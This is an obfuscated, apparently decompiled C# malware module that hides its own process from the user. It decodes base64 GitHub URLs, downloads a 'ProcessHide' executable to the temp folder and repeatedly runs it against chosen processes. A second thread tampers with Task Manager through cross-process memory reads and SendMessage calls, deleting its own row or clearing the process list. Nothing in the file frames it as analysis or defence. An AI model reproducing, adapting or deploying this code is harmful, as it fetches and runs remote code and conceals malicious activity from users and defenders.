using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace MufMaOSvGyvz;

internal class FAripJTXHNalmT
{
	private struct dKbHtpDNcyBx
	{
		public uint laPFOpqrWXuj;

		public IntPtr TJgUaBOUBT;

		public IntPtr VSUSauiToCtS;

		public uint ZgoSmFztkCuP;

		public uint HOTinmJKMbJDIGg;

		public IntPtr wXxIWQZbNvLd;

		public uint SHlkcsOkGpZs;

		public int JLQNzdehnuTU;

		public IntPtr rruYURRPeG;
	}

	private static volatile bool wyfMfGMephQYv = false;

	public static volatile bool MBcnWmpVGoY = true;

	public static string HVdDOGYwRUMbY()
	{
		if (IntPtr.Size == 8)
		{
			IyUWqQZlcOSTLhq.idAGkbKivQU = aCnqtSuKCmAZoP(new Uri(IyUWqQZlcOSTLhq.jKGdMalhZeKXBCvc("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlNjQuZXhl")));
		}
		else
		{
			IyUWqQZlcOSTLhq.idAGkbKivQU = aCnqtSuKCmAZoP(new Uri(IyUWqQZlcOSTLhq.jKGdMalhZeKXBCvc("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlMzIuZXhl")));
		}
		return IyUWqQZlcOSTLhq.idAGkbKivQU;
	}

	public static string aCnqtSuKCmAZoP(Uri uri_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process QmucamfUxZMxrb(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void bTnVewWeool(string[] string_0)
	{
		string text = HVdDOGYwRUMbY();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string string_ in string_0)
			{
				Process process = QmucamfUxZMxrb(string_);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					IyUWqQZlcOSTLhq.tbluQOozLSqDhFc(text, text2 + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					IyUWqQZlcOSTLhq.tbluQOozLSqDhFc(text, text2 + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + " *32");
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr hpVveBdaWnIOYwwXL);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr lwnhiHQymS, IntPtr MVXdKsATqXjz, byte[] bkwmIIPdfbtubjzt, uint vfujrsmJYTYOJ, out UIntPtr VPgzioQLDTipZa);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr cnKjHptFUVK, IntPtr mVxmaCVnaXkzH, [Out] byte[] kIhITkZndbo, int DBnBUzxFnURa, out UIntPtr LukJReEMLTi);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr uAVwxRJcBfGrC, out uint DcJpBfTnaufiPjJ);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] xlkMLKlWGZWwZ(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr hudlnRxOPs(uint uint_0)
	{
		return OpenProcess(56, bool_0: false, uint_0);
	}

	private static void wAMYYYwXmK(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr FsCAEUIVSVWd(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void tKMDpFSpGuZN(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr NtLonxvoOxB()
	{
		IntPtr intPtr = FindWindow("TaskManagerWindow", "Administrador de tareas");
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow("#32770", "Task Manager");
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
			return FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Processes");
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
		return FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Procesos");
	}

	private static IntPtr fIkVfvUgSjPG(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void wgrXTwnNAaf(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void OuHgjAYREBr(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string tUqinHynNcPVsx(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		dKbHtpDNcyBx dKbHtpDNcyBx = default(dKbHtpDNcyBx);
		GetWindowThreadProcessId(intptr_0, out var DcJpBfTnaufiPjJ);
		IntPtr intPtr = hudlnRxOPs(DcJpBfTnaufiPjJ);
		IntPtr intPtr2 = FsCAEUIVSVWd((uint)Marshal.SizeOf(dKbHtpDNcyBx), intPtr);
		IntPtr intPtr3 = FsCAEUIVSVWd(50u, intPtr);
		dKbHtpDNcyBx.TJgUaBOUBT = intptr_1;
		dKbHtpDNcyBx.VSUSauiToCtS = (IntPtr)0;
		dKbHtpDNcyBx.SHlkcsOkGpZs = 50u;
		dKbHtpDNcyBx.wXxIWQZbNvLd = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, xlkMLKlWGZWwZ(dKbHtpDNcyBx), (uint)Marshal.SizeOf(dKbHtpDNcyBx), out var VPgzioQLDTipZa);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out VPgzioQLDTipZa);
		tKMDpFSpGuZN(intPtr, intPtr2, (uint)Marshal.SizeOf(dKbHtpDNcyBx));
		tKMDpFSpGuZN(intPtr, intPtr3, 50u);
		wAMYYYwXmK(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void KCoFoxHfCdddyk(string string_0)
	{
		IntPtr intPtr = NtLonxvoOxB();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)fIkVfvUgSjPG(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = tUqinHynNcPVsx(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				wgrXTwnNAaf(intPtr, (IntPtr)i);
			}
		}
	}

	private static void DovaYSxHzOl()
	{
		IntPtr intPtr = NtLonxvoOxB();
		if (intPtr != IntPtr.Zero)
		{
			OuHgjAYREBr(intPtr);
			OuHgjAYREBr(intPtr);
			OuHgjAYREBr(intPtr);
			OuHgjAYREBr(intPtr);
			OuHgjAYREBr(intPtr);
		}
	}

	public static void QvJxjZHBdlZUQ()
	{
		Thread thread = new Thread(jihBulueichnMdbb);
		thread.Start();
	}

	private static void jihBulueichnMdbb()
	{
		while (!wyfMfGMephQYv)
		{
			if (MBcnWmpVGoY)
			{
				KCoFoxHfCdddyk(Process.GetCurrentProcess().ProcessName + ".exe");
				Thread.Sleep(525);
			}
			else
			{
				DovaYSxHzOl();
				Thread.Sleep(1000);
			}
		}
		wyfMfGMephQYv = false;
	}
}
